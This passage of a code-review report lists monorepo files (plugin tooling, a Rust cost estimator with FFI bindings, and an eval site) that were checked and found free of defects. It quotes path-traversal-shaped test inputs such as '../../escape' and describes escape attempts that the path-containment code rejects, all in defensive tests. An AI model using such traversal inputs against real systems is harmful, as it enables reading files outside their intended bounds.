- `packages/mint/test/publish-matrix.test.ts` and `platform-projections.test.ts` — the anti-tampering tests (frozen `record.plugin`/`.author`/`.targets`, `TypeError` on attempted mutation of `adapters`/`claudeCode.emit`, provenance rejection when records are replayed against a mutated registry or a second `resolvePlatform()` call) are coherent and each restores the mutated global in a `finally`, so they don't leak state to later tests in the same run.
- `packages/mint/test/provenance.test.ts` and the Unicode case-folding fixture check in `payload.test.ts` — both pin an independent, byte-verified digest of `CaseFolding-16.0.0.txt` and cross-check `artifactCollisionKey` against every `C`/`F` row parsed directly from that fixture (1557 rows), rather than trusting the production code's own embedded table.

- `packages/tab/bindings/go/tab/tab.go`, `loader.go`, `loader_unsupported.go`, `embed_stub.go`, `tab_test.go`, `pricing_env_test.go`, `pricing_env_unsupported_test.go`, `loader_embed_test.go`, `cmd/total/main.go` — the C-string marshalling (`cstr`/`drain`), `runtime.KeepAlive` placement around FFI calls, the `sync.Once`-guarded loader, and the build-tag split between the purego-backed loader and the `!darwin && !linux` stub all matched their documented intent. The final-file tamper checks added for CR-081/CR-082 (re-hash on read, replace a symlinked target rather than writing through it) were exercised and are correct for the case they target (see the separate finding above for the narrower case they do not cover).
- `packages/tab/bindings/python/moe_tab/__init__.py` and `_lib.py` — the ctypes `restype`/`argtypes` declarations match the calls made against them; `_decode_and_free` copies the C string into a Python `bytes` via `.value` before freeing, so there is no use-after-free; error decoding mirrors the Go/TS envelope-parsing logic.
- `packages/tab/bindings/python/setup.py` — the `BinaryDistribution`/`bdist_wheel` override is a standard, correct pattern for shipping a platform-tagged, ABI-agnostic prebuilt-binary wheel.
- `packages/tab/bindings/python/tests/test_moe_tab.py` and `packages/tab/bindings/typescript/test/ffi/tab.test.ts` — both derive the expected version from `packages/tab/Cargo.toml`'s `[workspace.package] version`; confirmed by reading that file and `moe-tab-ffi`/`moe-tab-core`'s `Cargo.toml` that both crates inherit it via `version.workspace = true`, so the regex match (which anchors on `^version` and only matches the workspace-level line) is correct and won't drift silently on a version bump.
- `packages/tab/bindings/typescript/src/ffi.ts`, `ffi-bun.ts`, `ffi-node.ts`, `pricing-env.ts`, `lib-path.ts`, `total.ts`, `types.ts`, `bun-ffi.d.ts` — the Bun/koffi split correctly avoids importing `bun:ffi` under Node and vice versa; the `void**` (not `char**`) koffi signature for the out-param avoids the auto-stringify pointer leak the comment describes; the `BigUint64Array`/`Number(p)` pointer narrowing in the Bun backend is safe for real user-space addresses as documented; `pricing_source` was verified present in the Rust core's serialized `CostEstimate` (via `moe-tab-cli/tests/cli.rs`'s `estimate_reports_bundled_pricing_source`), so declaring it non-optional in `types.ts` is correct.
- `packages/tab/bindings/typescript/test/unit/errors.test.ts`, `lib-path.test.ts`, `vitest.config.ts` — the unit/ffi project split and `fileParallelism: false` correctly account for the shared-process-env hazard the comments describe.
- `packages/tab/crates/moe-tab-cli/src/main.rs` — `utc_stamp_from_epoch`'s Howard Hinnant civil-from-days implementation was independently re-implemented and run against all four of the file's own test vectors (including the 2000-02-29 leap-day case); all four matched exactly.
- `packages/tab/crates/moe-tab-cli/tests/cli.rs` — the hermetic pricing-source tests correctly isolate `XDG_DATA_HOME`/`MOE_TAB_PRICING_DIR` so they don't depend on the developer's real home directory.
- `packages/statusline/tsup.config.ts`, `packages/statusline/vitest.config.ts` — small, declarative configs; both match their documented rationale and neighboring packages' conventions.

- `cost::estimate` (`packages/tab/crates/moe-tab-core/src/cost.rs`): the
  native-cost-vs-rate-table precedence, the `unpriced_models` vs
  `UnknownModelForTurn` distinction for empty model strings, and the
  `AssumedStandardTier`/`UnknownModelForTurn` approximation flags were traced
  end to end and match their test coverage; ran the crate's own test suite
  (`cargo test -p moe-tab-core`, 68 passed) to confirm no regressions in this
  tree.
- `pricing::as_of` (`as_of.rs`): the `sort_key` parser is a strict, allocation-free
  byte-level validator (no `chrono`), correctly rejects path-traversal-shaped
  and malformed stamps (verified the test list explicitly includes
  `"../../escape"` and `"2026-06-09/evil"`), and `archive_file_name` is only
  ever called after `validate`/`sort_key` has succeeded (checked every call
  site), so it cannot be reached with attacker-controlled path separators.
- `transcript::atif::parse` (`atif.rs`): traced the three-way cost precedence
  (per-step sum wins when complete; `final_metrics.total_cost_usd` wins and
  suppresses per-step rate-table math when incomplete; rate-table is the
  fallback) against all nine of its dedicated tests, including the two
  double-count guards — no gap found beyond the documented, intentional
  loss of per-model cost granularity when a totals-only override fires.
- `transcript::provider::{anthropic,openai}` normalizers: the Anthropic
  5m/1h cache-write split and the OpenAI cached-token subtraction
  (`saturating_sub`, so a corrupt `cached_tokens > input_tokens` clamps to
  zero instead of underflowing) both match the documented provider billing
  semantics.
- `moe-tab-ffi/src/lib.rs`: the ownership contract (NULL-init before catch_unwind,
  freeable-string-or-NULL invariant, `catch_unwind`/`AssertUnwindSafe` around
  both entry points, NULL-pointer checks preceding every `CStr::from_ptr`) was
  read against every exit path in both `moe_tab_estimate_path` and
  `moe_tab_refresh_pricing`; ran `cargo test -p moe-tab-ffi` (13 passed,
  including `header_matches_source`, which regenerates the cbindgen header
  and diffs it against the committed `include/moe_tab.h`) to confirm the C
  ABI surface is in sync with the source in this tree.

- `slugify` (`py/proof/src/moe_proof/cli.py`): the `"", ".", ".."` fallback
  to a content-derived hash, and its interaction with
  `resolve_eval_slugs`'s duplicate-slug guard and `build_eval`'s
  `shutil.rmtree(eval_dir)` guard, is exercised by
  `test_never_returns_empty_for_all_unsafe_characters`,
  `test_never_returns_dot_or_dotdot`,
  `test_distinct_unsafe_names_still_get_distinct_slugs` (`test_units.py`) and
  `test_build_with_an_all_unsafe_name_does_not_wipe_other_evals`
  (`test_site.py`, regression-labeled CR-085). Confirmed the fallback cannot
  collapse two different unsafe names onto the same slug (SHA-256 truncated
  to 12 hex chars) and cannot reintroduce `"."`/`".."`.
- `site.py`'s `serve_eval` path-containment check
  (`target.is_relative_to(runs_root)` after `.resolve()`) correctly rejects
  both a same-prefix sibling directory (`runs-secret/`) and a `..`-escape out
  of the eval directory entirely; verified by tracing the exact string
  transformations `self.path.split("?")[0]` -> `removeprefix("/evals/")` ->
  `partition("/")` against the URLs used in
  `test_serve_refuses_prefix_sibling_of_runs` and
  `test_serve_refuses_paths_outside_runs`, and confirmed with pathlib that an
  internal `//` in the tail cannot be used to smuggle an absolute-path
  override past the `tail.startswith("runs/")` gate.
- `grade_run`'s scoring rule — a check that fails without producing a score
  poisons the whole Grade's score to `None` even if a later check does
  produce one (`unscored_failure`), while a later score legitimately
  overrides an earlier one when every failing check that ran did score
  itself — matches `test_last_score_wins`,
  `test_non_required_failure_continues`, and
  `test_unscored_failure_leaves_grade_unscored` exactly.
- `render_leaderboard`'s competition-style tied-rank display
  (`test_leaderboard_orders_by_mean_and_shares_tied_ranks`) correctly ranks
  by the *displayed* (rounded) mean rather than the raw float mean, so
  genuinely-tied display strings share a rank and the next rank skips
  accordingly.
- `discover_evals` correctly stops descent at the first `eval.yaml` found
  (so a `runs/` tree is never re-scanned for nested "decoy" evals) and skips
  dotfile directories; matches
  `test_discover_evals_recurses_and_stops_at_evals`.
- `normalize_check_info`'s core-key protection (`score`, `metrics`, `tags`,
  `notes`, `details` are the only keys ever promoted to the top level;
  everything else, including a checker that emits `ok`/`checker`/`skipped`
  itself, is folded into `details`) is correct and matches
  `test_core_keys_cannot_be_clobbered`.

- `scripts/lib/mint-generation-transaction.mjs` — the durable three-target
  swap/recovery state machine (`replaceGeneratedOutputs`,
  `recoverGeneratedOutputs`, `stateFor`, `restoreOld`, `finishNew`). Traced
  the classification of every reachable interleaving of
  `unstarted`/`backed-up`/`committed`/`clean` across the three targets,
  including partial-commit crashes mid-loop (e.g. `[committed, backed-up,
  unstarted]`) and partial-cleanup crashes after commit (`[committed,
  clean]`), and the "old" vs "new" generation selection correctly resolves
  each to one coherent generation across all three targets. The
  journal-removed-but-fsync-failed edge case is deliberately surfaced as a
  distinct `*_DURABILITY_UNCERTAIN` error rather than silently retried, and
  the "trusted boundary" identity re-check (`captureTrustedBoundary`/
  `guarded`) brackets every mutating step against a concurrent parent-path
  replacement. Portable-path validation (`portableParts`, `validateShape`,
  `assertSymlinkFreeAncestry`) rejects absolute paths, `..`/`.` segments, and
  symlinked ancestry before any mutation.
- `scripts/write-bundle-inventory.mjs` — `safeMetafilePath`'s allowlist of
  exact expected metafile locations plus a post-`realpath` containment check
  (`contained`), the absolute/UNC/drive-letter path rejection
  (`isMachineAbsolute`/`assertRelativeMetafilePath`) applied to every input,
  output, and import path parsed out of a metafile, and the symlink guard in
  `prepareEvidenceRoot` before a recursive `rm`. Traced the normalize →
  validate → write pipeline end to end; found no path-escape or malformed-
  input gap.
- `scripts/check-session-start-hooks.mjs` — the packaged-artifact integration
  test correctly builds a real npm tarball (`npm pack --ignore-scripts`),
  extracts it outside the repo, asserts no `node_modules` leaked in and the
  extraction path isn't itself beneath a `node_modules`, and runs each
  packed `SessionStart` command with an intentionally minimal env (no `HOME`,
  no ambient `NODE_*`) to catch a hook that only works by accident inside the
  monorepo's own dependency tree. The tempdir-outside-repo assertion
  (`realpathSync` + `relative(...).startsWith("..")`) and the mandatory
  empty-stdout/stderr contract in `runHook` were verified against the code
  as written.
- `scripts/mint-plugins.mjs` — `validateCanonicalPluginRegistry`'s
  cross-check between the dependency-free `bin/lib/plugin-registry.mjs` and
  the resolved Mint platform (id/source/config/repository/npm package/active
  harness set in both directions, plus duplicate-value detection) and the
  `runMintPlugins` orchestration's cleanup-on-failure logic (only removing
  prepared `next` outputs when the durable journal was never written or has
  already been resolved by the transaction module itself) were traced and
  are internally consistent with the transaction module's own contract.
- `scripts/mint-prepare.mjs`, `scripts/mint-recover.mjs`,
  `scripts/test-provenance-red.mjs`, `scripts/check-artifacts.mjs`,
  `scripts/clean-package-dist.mjs`, `scripts/copy-license.mjs`,
  `scripts/lib/mint-diagnostics.mjs`, `scripts/lib/mint-host-contract.mjs` —
  read in full; each is a small, single-purpose wrapper and no defect was
  found. `test-provenance-red.mjs` and `check-artifacts.mjs` were also run
  directly against the current tree to confirm their expected exit codes.
